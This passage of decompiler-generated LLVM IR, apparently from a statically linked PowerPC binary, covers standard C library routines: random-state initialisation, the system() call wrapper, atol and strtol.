  %v3_1000f7d0 = inttoptr i32 %v2_1000f7d0 to i32*
  store i32 %v0_1000f7d0, i32* %v3_1000f7d0, align 4
  %v0_1000f7d4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f7d4 = add i32 %v0_1000f7d4, -1
  store i32 %v1_1000f7d4, i32* %ctr.global-to-local, align 4
  %v2_1000f7d4 = icmp eq i32 %v1_1000f7d4, 0
  br i1 %v2_1000f7d4, label %dec_label_pc_1000f7d4.dec_label_pc_1000f7d8_crit_edge, label %dec_label_pc_1000f7d0.dec_label_pc_1000f7b0_crit_edge

dec_label_pc_1000f7d0.dec_label_pc_1000f7b0_crit_edge: ; preds = %dec_label_pc_1000f7d0
  %v1_1000f7b0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f7b0

dec_label_pc_1000f7d4.dec_label_pc_1000f7d8_crit_edge: ; preds = %dec_label_pc_1000f7d0
  %v0_1000f7d8.pre = load i32, i32* @r30, align 4
  %v0_1000f7dc.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000f7e0.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000f7d8

dec_label_pc_1000f7d8:                            ; preds = %dec_label_pc_1000f7d4.preheader.thread, %dec_label_pc_1000f7d4.dec_label_pc_1000f7d8_crit_edge, %dec_label_pc_1000f7d4.preheader
  %v0_1000f7e0 = phi i32 [ %v0_1000f7e0.pre, %dec_label_pc_1000f7d4.dec_label_pc_1000f7d8_crit_edge ], [ %v0_1000f798, %dec_label_pc_1000f7d4.preheader ], [ %v0_1000f798, %dec_label_pc_1000f7d4.preheader.thread ]
  %v0_1000f7dc = phi i32 [ %v0_1000f7dc.pre, %dec_label_pc_1000f7d4.dec_label_pc_1000f7d8_crit_edge ], [ %v3_1000f780, %dec_label_pc_1000f7d4.preheader ], [ %v3_1000f780, %dec_label_pc_1000f7d4.preheader.thread ]
  %v1_1000f7e0 = phi i32 [ %v0_1000f7d8.pre, %dec_label_pc_1000f7d4.dec_label_pc_1000f7d8_crit_edge ], [ %v0_1000f780, %dec_label_pc_1000f7d4.preheader ], [ %v0_1000f780, %dec_label_pc_1000f7d4.preheader.thread ]
  %v1_1000f7d8 = add i32 %v1_1000f7e0, 20
  %v2_1000f7d8 = inttoptr i32 %v1_1000f7d8 to i32*
  %v3_1000f7d8 = load i32, i32* %v2_1000f7d8, align 4
  store i32 %v3_1000f7d8, i32* %r0.global-to-local, align 4
  %v1_1000f7dc = mul i32 %v0_1000f7dc, 10
  store i32 %v1_1000f7dc, i32* %r31.global-to-local, align 4
  %v2_1000f7e0 = add i32 %v1_1000f7e0, 4
  %v3_1000f7e0 = inttoptr i32 %v2_1000f7e0 to i32*
  store i32 %v0_1000f7e0, i32* %v3_1000f7e0, align 4
  %v0_1000f7e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f7e4 = mul i32 %v0_1000f7e4, 4
  %v0_1000f7e8 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000f7e8 = add i32 %v0_1000f7e8, %v1_1000f7e4
  store i32 %v2_1000f7e8, i32* %r0.global-to-local, align 4
  %v1_1000f7ec = load i32, i32* @r30, align 4
  %v2_1000f7ec = inttoptr i32 %v1_1000f7ec to i32*
  store i32 %v2_1000f7e8, i32* %v2_1000f7ec, align 4
  %v2_1000f800 = ptrtoint i32* %stack_var_-24 to i32
  %v0_1000f7f821 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000f7f822 = add i32 %v0_1000f7f821, -1
  store i32 %v1_1000f7f822, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1000f7f822, -1
  br i1 %tmp2025, label %dec_label_pc_1000f7f4, label %dec_label_pc_1000f808

dec_label_pc_1000f7f4:                            ; preds = %dec_label_pc_1000f7d8, %dec_label_pc_1000f7f4
  %v0_1000f7fc26 = load i32, i32* @r30, align 4
  %v2_1000f7f4 = inttoptr i32 %v0_1000f7fc26 to i32*
  %v3_1000f7f4 = call i32 @__GI_random_r(i32* %v2_1000f7f4, i32 %v2_1000f800)
  %v0_1000f7f8 = load i32, i32* @r31, align 4
  %v1_1000f7f8 = add i32 %v0_1000f7f8, -1
  store i32 %v1_1000f7f8, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_1000f7f8, -1
  br i1 %tmp20, label %dec_label_pc_1000f7f4, label %dec_label_pc_1000f808

dec_label_pc_1000f808:                            ; preds = %dec_label_pc_1000f7d8, %dec_label_pc_1000f7f4, %dec_label_pc_1000f774
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000f80c

dec_label_pc_1000f80c:                            ; preds = %entry, %dec_label_pc_1000f808
  %v0_1000f80c = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1000f808 ]
  store i32 %v0_1000f740, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000f80c

; uselistorder directives
  uselistorder i32 %v1_1000f7d4, { 1, 0 }
  uselistorder i32 %v2_1000f7d0, { 1, 0 }
  uselistorder i32 %v2_1000f7c4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000f7b0, { 1, 0 }
  uselistorder i32 %v0_1000f798, { 1, 2, 0 }
  uselistorder i32 %v3_1000f780, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_1000f80c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f808, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f7f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f7d8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f7d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f7b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f774, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000f824 = icmp ugt i32 %arg2, 127
  %v0_1000f82c = load i32, i32* @lr, align 4
  store i32 %v0_1000f82c, i32* %r0.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v1_1000f838 = sub i32 255, %arg2
  %v2_1000f838 = sub i32 -1, %arg2
  %not.v5_1000f838 = icmp ugt i32 %v1_1000f838, %v2_1000f838
  %v6_1000f83c = sext i1 %not.v5_1000f838 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_1000f844 = add i32 %tmp, 4
  store i32 %v1_1000f844, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001a0f4.775 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_1000f85c = sub nsw i32 3, %v6_1000f83c
  store i32 %v1_1000f85c, i32* @r31, align 4
  br i1 %v2_1000f824, label %dec_label_pc_1000f884, label %dec_label_pc_1000f864

dec_label_pc_1000f864:                            ; preds = %entry
  %v2_1000f850 = icmp ugt i32 %arg2, 31
  %v1_1000f864 = sub i32 63, %arg2
  %not.v5_1000f864 = icmp ugt i32 %v1_1000f864, %v2_1000f838
  %v6_1000f868 = sext i1 %not.v5_1000f864 to i32
  %v1_1000f870 = sub nsw i32 1, %v6_1000f868
  store i32 %v1_1000f870, i32* @r31, align 4
  br i1 %v2_1000f850, label %dec_label_pc_1000f884, label %dec_label_pc_1000f878

dec_label_pc_1000f878:                            ; preds = %dec_label_pc_1000f864
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_1000f8e4, label %dec_label_pc_1000f884

dec_label_pc_1000f884:                            ; preds = %dec_label_pc_1000f878, %dec_label_pc_1000f864, %entry
  %v0_1000f884 = phi i32 [ 0, %dec_label_pc_1000f878 ], [ %v1_1000f870, %dec_label_pc_1000f864 ], [ %v1_1000f85c, %entry ]
  %v1_1000f884 = mul nsw i32 %v0_1000f884, 4
  store i32 %v1_1000f884, i32* %r0.global-to-local, align 4
  %v2_1000f888 = add i32 %arg3, 12
  %v3_1000f888 = inttoptr i32 %v2_1000f888 to i32*
  store i32 %v0_1000f884, i32* %v3_1000f888, align 4
  %v0_1000f88c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f88c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000f88c = add i32 %v1_1000f88c, %v0_1000f88c
  store i32 %v2_1000f88c, i32* %r9.global-to-local, align 4
  %v3_1000f890 = inttoptr i32 %v2_1000f88c to i32*
  %v4_1000f890 = load i32, i32* %v3_1000f890, align 4
  store i32 %v4_1000f890, i32* %r0.global-to-local, align 4
  %v1_1000f894 = add i32 %v2_1000f88c, 20
  %v2_1000f894 = inttoptr i32 %v1_1000f894 to i32*
  %v3_1000f894 = load i32, i32* %v2_1000f894, align 4
  store i32 %v3_1000f894, i32* %r9.global-to-local, align 4
  %v1_1000f898 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000f898 = add i32 %v1_1000f898, 20
  %v3_1000f898 = inttoptr i32 %v2_1000f898 to i32*
  store i32 %v4_1000f890, i32* %v3_1000f898, align 4
  %v0_1000f89c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f89c = mul i32 %v0_1000f89c, 4
  store i32 %v1_1000f89c, i32* %r0.global-to-local, align 4
  %v0_1000f8a0 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f8a0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000f8a0 = add i32 %v1_1000f8a0, 8
  %v3_1000f8a0 = inttoptr i32 %v2_1000f8a0 to i32*
  store i32 %v0_1000f8a0, i32* %v3_1000f8a0, align 4
  %v0_1000f8a4 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f8a4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000f8a4 = add i32 %v1_1000f8a4, %v0_1000f8a4
  store i32 %v2_1000f8a4, i32* %r0.global-to-local, align 4
  %v0_1000f8a8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f8a8 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000f8a8 = add i32 %v1_1000f8a8, 16
  %v3_1000f8a8 = inttoptr i32 %v2_1000f8a8 to i32*
  store i32 %v0_1000f8a8, i32* %v3_1000f8a8, align 4
  %v0_1000f8ac = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f8ac = load i32, i32* %r30.global-to-local, align 4
  %v2_1000f8ac = add i32 %v1_1000f8ac, 24
  %v3_1000f8ac = inttoptr i32 %v2_1000f8ac to i32*
  store i32 %v0_1000f8ac, i32* %v3_1000f8ac, align 4
  store i32 268499124, i32* @lr, align 4
  %v0_1000f8b0 = call i32 @srandom_r()
  %v0_1000f8b4 = load i32, i32* @r31, align 4
  %v3_1000f8b4 = icmp eq i32 %v0_1000f8b4, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000f8c0 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000f8c0 = inttoptr i32 %v1_1000f8c0 to i32*
  store i32 0, i32* %v2_1000f8c0, align 4
  br i1 %v3_1000f8b4, label %dec_label_pc_1000f8f8, label %dec_label_pc_1000f8c8

dec_label_pc_1000f8c8:                            ; preds = %dec_label_pc_1000f884
  %v0_1000f8c8 = load i32, i32* @r30, align 4
  %v1_1000f8c8 = add i32 %v0_1000f8c8, 4
  %v2_1000f8c8 = inttoptr i32 %v1_1000f8c8 to i32*
  %v3_1000f8c8 = load i32, i32* %v2_1000f8c8, align 4
  %v0_1000f8cc = load i32, i32* %r29.global-to-local, align 4
  %v2_1000f8cc = sub i32 %v3_1000f8c8, %v0_1000f8cc
  %v4_1000f8d0 = sdiv i32 %v2_1000f8cc, 4
  %v1_1000f8d4 = mul i32 %v4_1000f8d0, 5
  %v1_1000f8d8 = load i32, i32* @r31, align 4
  %v2_1000f8d8 = add i32 %v1_1000f8d4, %v1_1000f8d8
  store i32 %v2_1000f8d8, i32* %r0.global-to-local, align 4
  %v1_1000f8dc = load i32, i32* %r27.global-to-local, align 4
  %v2_1000f8dc = inttoptr i32 %v1_1000f8dc to i32*
  store i32 %v2_1000f8d8, i32* %v2_1000f8dc, align 4
  br label %dec_label_pc_1000f8f8

dec_label_pc_1000f8e4:                            ; preds = %dec_label_pc_1000f878
  %v0_1000f8e4 = call i32 @__errno_location()
  store i32 %v0_1000f8e4, i32* %r3.global-to-local, align 4
  %v0_1000f8e8 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000f8e8 = inttoptr i32 %v0_1000f8e4 to i32*
  store i32 %v0_1000f8e8, i32* %v2_1000f8e8, align 4
  %v0_1000f8ec = call i32 @__errno_location()
  %v0_1000f8f0 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000f8f0 = inttoptr i32 %v0_1000f8ec to i32*
  store i32 %v0_1000f8f0, i32* %v2_1000f8f0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f8f8

dec_label_pc_1000f8f8:                            ; preds = %dec_label_pc_1000f884, %dec_label_pc_1000f8c8, %dec_label_pc_1000f8e4
  store i32 %v0_1000f82c, i32* %r0.global-to-local, align 4
  %v0_1000f908 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000f908

; uselistorder directives
  uselistorder i32 %v2_1000f88c, { 1, 0, 2 }
  uselistorder i32 %v0_1000f884, { 1, 0 }
  uselistorder i32 %v2_1000f838, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001a0f4.775 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_1000f8f8, { 2, 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000f914 = load i32, i32* @r31, align 4
  %v3_1000f91c = icmp eq i32 %arg1, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000f91c, label %dec_label_pc_1000fa4c, label %dec_label_pc_1000f92c

dec_label_pc_1000f92c:                            ; preds = %entry
  store i32 268499256, i32* @lr, align 4
  %v2_1000f934 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268499272, i32* @lr, align 4
  %v2_1000f944 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 268499288, i32* @lr, align 4
  %v2_1000f954 = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_1000f954, i32* @r3, align 4
  store i32 268499296, i32* @lr, align 4
  %v0_1000f95c = call i32 @__vfork()
  store i32 %v0_1000f95c, i32* @r31, align 4
  %tmp10 = icmp sgt i32 %v0_1000f95c, -1
  br i1 %tmp10, label %dec_label_pc_1000f994, label %dec_label_pc_1000f968

dec_label_pc_1000f968:                            ; preds = %dec_label_pc_1000f92c
  store i32 268499316, i32* @lr, align 4
  %v2_1000f970 = call i32 @__bsd_signal(i32 3, i32 %v2_1000f934)
  store i32 268499328, i32* @lr, align 4
  %v2_1000f97c = call i32 @__bsd_signal(i32 2, i32 %v2_1000f944)
  store i32 268499340, i32* @lr, align 4
  %v2_1000f988 = call i32 @__bsd_signal(i32 17, i32 %v2_1000f954)
  br label %dec_label_pc_1000fa4c

dec_label_pc_1000f994:                            ; preds = %dec_label_pc_1000f92c
  %v3_1000f960 = icmp eq i32 %v0_1000f95c, 0
  br i1 %v3_1000f960, label %dec_label_pc_1000f998, label %dec_label_pc_1000f9ec

dec_label_pc_1000f998:                            ; preds = %dec_label_pc_1000f994
  store i32 268499364, i32* @lr, align 4
  %v2_1000f9a0 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 268499376, i32* @lr, align 4
  %v2_1000f9ac = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 268499388, i32* @lr, align 4
  %v2_1000f9b8 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_1000f9e0 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1001a11c.777 to i32), i32 ptrtoint ([3 x i8]* @global_var_1001a124.778 to i32), i32 ptrtoint ([3 x i8]* @global_var_1001a128.779 to i32), i32 %arg1, i32 0)
  %v1_1000f9e8 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_1000f9ec

dec_label_pc_1000f9ec:                            ; preds = %dec_label_pc_1000f994, %dec_label_pc_1000f998
  store i32 268499448, i32* @lr, align 4
  %v2_1000f9f4 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268499460, i32* @lr, align 4
  %v2_1000fa00 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_1000fa04 = load i32, i32* @r31, align 4
  store i32 268499480, i32* @lr, align 4
  %v4_1000fa14 = call i32 @wait4(i32 %v0_1000fa04)
  %v3_1000fa18 = icmp eq i32 %v4_1000fa14, -1
  br i1 %v3_1000fa18, label %dec_label_pc_1000fa20, label %dec_label_pc_1000fa24

dec_label_pc_1000fa20:                            ; preds = %dec_label_pc_1000f9ec
  store i32 -1, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1000fa24

dec_label_pc_1000fa24:                            ; preds = %dec_label_pc_1000f9ec, %dec_label_pc_1000fa20
  store i32 268499504, i32* @lr, align 4
  %v2_1000fa2c = call i32 @__bsd_signal(i32 3, i32 %v2_1000f934)
  store i32 268499516, i32* @lr, align 4
  %v2_1000fa38 = call i32 @__bsd_signal(i32 2, i32 %v2_1000f944)
  store i32 268499528, i32* @lr, align 4
  %v2_1000fa44 = call i32 @__bsd_signal(i32 17, i32 %v2_1000f954)
  %v3_1000fa48 = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1000fa4c

dec_label_pc_1000fa4c:                            ; preds = %entry, %dec_label_pc_1000f968, %dec_label_pc_1000fa24
  %v0_1000fa5c = phi i32 [ 1, %entry ], [ -1, %dec_label_pc_1000f968 ], [ %v3_1000fa48, %dec_label_pc_1000fa24 ]
  store i32 %v0_1000f914, i32* @r31, align 4
  ret i32 %v0_1000fa5c

; uselistorder directives
  uselistorder i32 %v0_1000f95c, { 1, 0, 2 }
  uselistorder i32 %v2_1000f954, { 1, 0, 2 }
  uselistorder i32 %v2_1000f944, { 1, 0 }
  uselistorder i32 %v2_1000f934, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000fa4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000fa24, { 1, 0 }
  uselistorder label %dec_label_pc_1000f9ec, { 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_1000fa68 = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_1000fa68
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_1000fa70 = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_1000fa70
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000fa84 = load i32, i32* @r4, align 4
  store i32 %v0_1000fa84, i32* @r25, align 4
  %v0_1000fa8c = load i32, i32* @r5, align 4
  store i32 %v0_1000fa8c, i32* %r30.global-to-local, align 4
  %v0_1000fa90 = load i32, i32* @r6, align 4
  store i32 %v0_1000fa90, i32* @r26, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1000fa98 = load i32, i32* @global_var_1002b8c0, align 4
  br label %dec_label_pc_1000faa4

dec_label_pc_1000faa0:                            ; preds = %dec_label_pc_1000faa4
  %v1_1000faa0 = add i32 %v0_1000fad8, 1
  store i32 %v1_1000faa0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000faa4

dec_label_pc_1000faa4:                            ; preds = %entry, %dec_label_pc_1000faa0
  %v0_1000fad8 = phi i32 [ %tmp, %entry ], [ %v1_1000faa0, %dec_label_pc_1000faa0 ]
  %v1_1000faa4 = inttoptr i32 %v0_1000fad8 to i8*
  %v2_1000faa4 = load i8, i8* %v1_1000faa4, align 1
  %v3_1000faa4 = zext i8 %v2_1000faa4 to i32
  %v1_1000faa8 = mul nuw nsw i32 %v3_1000faa4, 2
  %v2_1000faac = add i32 %v1_1000faa8, %v3_1000fa98
  %v3_1000faac = inttoptr i32 %v2_1000faac to i16*
  %v4_1000faac = load i16, i16* %v3_1000faac, align 2
  %v1_1000fab0 = and i16 %v4_1000faac, 32
  %v3_1000fab0 = icmp eq i16 %v1_1000fab0, 0
  br i1 %v3_1000fab0, label %dec_label_pc_1000fab8, label %dec_label_pc_1000faa0

dec_label_pc_1000fab8:                            ; preds = %dec_label_pc_1000faa4
  %v3_1000fab8 = icmp eq i8 %v2_1000faa4, 43
  br i1 %v3_1000fab8, label %dec_label_pc_1000fad8, label %dec_label_pc_1000fac0

dec_label_pc_1000fac0:                            ; preds = %dec_label_pc_1000fab8
  %v3_1000fac0 = icmp eq i8 %v2_1000faa4, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000fac0, label %dec_label_pc_1000fad8, label %dec_label_pc_1000fadc

dec_label_pc_1000fad8:                            ; preds = %dec_label_pc_1000fab8, %dec_label_pc_1000fac0
  %storemerge = phi i32 [ 1, %dec_label_pc_1000fac0 ], [ 0, %dec_label_pc_1000fab8 ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_1000fad8 = add i32 %v0_1000fad8, 1
  store i32 %v1_1000fad8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fadc

dec_label_pc_1000fadc:                            ; preds = %dec_label_pc_1000fac0, %dec_label_pc_1000fad8
  %v1_1000fadc = call i32 @__asm_rlwinm.(i32 %v0_1000fa8c, i32 0, i32 28, i32 26)
  %v4_1000fadc = icmp eq i32 %v1_1000fadc, 0
  br i1 %v4_1000fadc, label %dec_label_pc_1000fae8, label %dec_label_pc_1000fadc.dec_label_pc_1000fb24_crit_edge

dec_label_pc_1000fadc.dec_label_pc_1000fb24_crit_edge: ; preds = %dec_label_pc_1000fadc
  %v0_1000fb24.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000fb24

dec_label_pc_1000fae8:                            ; preds = %dec_label_pc_1000fadc
  %v0_1000fae8 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000fae8 = inttoptr i32 %v0_1000fae8 to i8*
  %v2_1000fae8 = load i8, i8* %v1_1000fae8, align 1
  %v0_1000faec = load i32, i32* %r30.global-to-local, align 4
  %v1_1000faec = add i32 %v0_1000faec, 10
  store i32 %v1_1000faec, i32* %r30.global-to-local, align 4
  %v3_1000faf0 = icmp eq i8 %v2_1000fae8, 48
  br i1 %v3_1000faf0, label %dec_label_pc_1000faf8, label %dec_label_pc_1000fb18

dec_label_pc_1000faf8:                            ; preds = %dec_label_pc_1000fae8
  %v1_1000faf8 = add i32 %v0_1000fae8, 1
  %v2_1000faf8 = inttoptr i32 %v1_1000faf8 to i8*
  %v3_1000faf8 = load i8, i8* %v2_1000faf8, align 1
  %v4_1000faf8 = zext i8 %v3_1000faf8 to i32
  store i32 %v1_1000faf8, i32* %r31.global-to-local, align 4
  %v1_1000fafc = add i32 %v0_1000faec, 8
  store i32 %v1_1000fafc, i32* %r30.global-to-local, align 4
  %v1_1000fb00 = or i32 %v4_1000faf8, 32
  %v3_1000fb08 = icmp eq i32 %v1_1000fb00, 120
  br i1 %v3_1000fb08, label %dec_label_pc_1000fb10, label %dec_label_pc_1000fb18

dec_label_pc_1000fb10:                            ; preds = %dec_label_pc_1000faf8
  %v1_1000fb10 = mul i32 %v1_1000fafc, 2
  store i32 %v1_1000fb10, i32* %r30.global-to-local, align 4
  %v1_1000fb14 = add i32 %v0_1000fae8, 2
  store i32 %v1_1000fb14, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fb18

dec_label_pc_1000fb18:                            ; preds = %dec_label_pc_1000faf8, %dec_label_pc_1000fae8, %dec_label_pc_1000fb10
  %v0_1000fbcc15 = phi i32 [ %v1_1000faf8, %dec_label_pc_1000fb10 ], [ %tmp, %dec_label_pc_1000fae8 ], [ %v1_1000faf8, %dec_label_pc_1000faf8 ]
  %v0_1000fb18 = phi i32 [ %v1_1000fb10, %dec_label_pc_1000fb10 ], [ %v1_1000faec, %dec_label_pc_1000fae8 ], [ %v1_1000fafc, %dec_label_pc_1000faf8 ]
  %tmp22 = icmp slt i32 %v0_1000fb18, 17
  br i1 %tmp22, label %dec_label_pc_1000fb24, label %dec_label_pc_1000fb20

dec_label_pc_1000fb20:                            ; preds = %dec_label_pc_1000fb18
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000fb24

dec_label_pc_1000fb24:                            ; preds = %dec_label_pc_1000fadc.dec_label_pc_1000fb24_crit_edge, %dec_label_pc_1000fb18, %dec_label_pc_1000fb20
  %v0_1000fbcc14 = phi i32 [ %tmp, %dec_label_pc_1000fadc.dec_label_pc_1000fb24_crit_edge ], [ %v0_1000fbcc15, %dec_label_pc_1000fb18 ], [ %v0_1000fbcc15, %dec_label_pc_1000fb20 ]
  %v1_1000fb38 = phi i32 [ %v0_1000fb24.pre, %dec_label_pc_1000fadc.dec_label_pc_1000fb24_crit_edge ], [ %v0_1000fb18, %dec_label_pc_1000fb18 ], [ 16, %dec_label_pc_1000fb20 ]
  %v1_1000fb24 = add i32 %v1_1000fb38, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1000fb2c = icmp ugt i32 %v1_1000fb24, 34
  br i1 %v2_1000fb2c, label %dec_label_pc_1000fbc4, label %dec_label_pc_1000fb34

dec_label_pc_1000fb34:                            ; preds = %dec_label_pc_1000fb24
  %v2_1000fb38 = udiv i32 -1, %v1_1000fb38
  store i32 %v2_1000fb38, i32* @r29, align 4
  %v2_1000fb3c = mul i32 %v2_1000fb38, %v1_1000fb38
  %v1_1000fb40 = sub i32 -1, %v2_1000fb3c
  %v1_1000fb44 = urem i32 %v1_1000fb40, 256
  store i32 %v1_1000fb44, i32* @r27, align 4
  %v0_1000fb50.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fb50

dec_label_pc_1000fb4c:                            ; preds = %dec_label_pc_1000fbb8, %dec_label_pc_1000fba0
  %v1_1000fb54.pre = phi i32 [ %v1_1000fb58, %dec_label_pc_1000fbb8 ], [ %v1_1000fb54.pre.pre, %dec_label_pc_1000fba0 ]
  %v0_1000fb54.pre = phi i32 [ %v2_1000fbbc, %dec_label_pc_1000fbb8 ], [ %v0_1000fb54.pre.pre, %dec_label_pc_1000fba0 ]
  %v0_1000fb4c = phi i32 [ %v1_1000fb5c, %dec_label_pc_1000fbb8 ], [ %v0_1000fb4c.pre, %dec_label_pc_1000fba0 ]
  br label %dec_label_pc_1000fb50

dec_label_pc_1000fb50:                            ; preds = %dec_label_pc_1000fb34, %dec_label_pc_1000fb4c
  %v0_1000fbcc12 = phi i32 [ %v0_1000fbcc14, %dec_label_pc_1000fb34 ], [ %v0_1000fb4c, %dec_label_pc_1000fb4c ]
  %v0_1000fb5c = phi i32 [ %v0_1000fb50.pre, %dec_label_pc_1000fb34 ], [ %v0_1000fb4c, %dec_label_pc_1000fb4c ]
  %v1_1000fb58 = phi i32 [ %v2_1000fb38, %dec_label_pc_1000fb34 ], [ %v1_1000fb54.pre, %dec_label_pc_1000fb4c ]
  %v0_1000fbb8 = phi i32 [ 0, %dec_label_pc_1000fb34 ], [ %v0_1000fb54.pre, %dec_label_pc_1000fb4c ]
  %v1_1000fb50 = inttoptr i32 %v0_1000fb5c to i8*
  %v2_1000fb50 = load i8, i8* %v1_1000fb50, align 1
  %v3_1000fb50 = zext i8 %v2_1000fb50 to i32
  %v3_1000fb54 = icmp ugt i32 %v0_1000fbb8, %v1_1000fb58
  %v1_1000fb5c = add i32 %v0_1000fb5c, 1
  store i32 %v1_1000fb5c, i32* %r31.global-to-local, align 4
  %v1_1000fb60 = add nsw i32 %v3_1000fb50, -48
  %v1_1000fb64 = or i32 %v3_1000fb50, 32
  %v1_1000fb68 = urem i32 %v1_1000fb60, 256
  %tmp23 = icmp ult i32 %v1_1000fb68, 10
  br i1 %tmp23, label %dec_label_pc_1000fb88, label %dec_label_pc_1000fb78

dec_label_pc_1000fb78:                            ; preds = %dec_label_pc_1000fb50
  %tmp24 = icmp ult i32 %v1_1000fb64, 97
  br i1 %tmp24, label %dec_label_pc_1000fb88, label %dec_label_pc_1000fb84

dec_label_pc_1000fb84:                            ; preds = %dec_label_pc_1000fb78
  %v1_1000fb78 = add nsw i32 %v1_1000fb64, -87
  %v1_1000fb84 = urem i32 %v1_1000fb78, 256
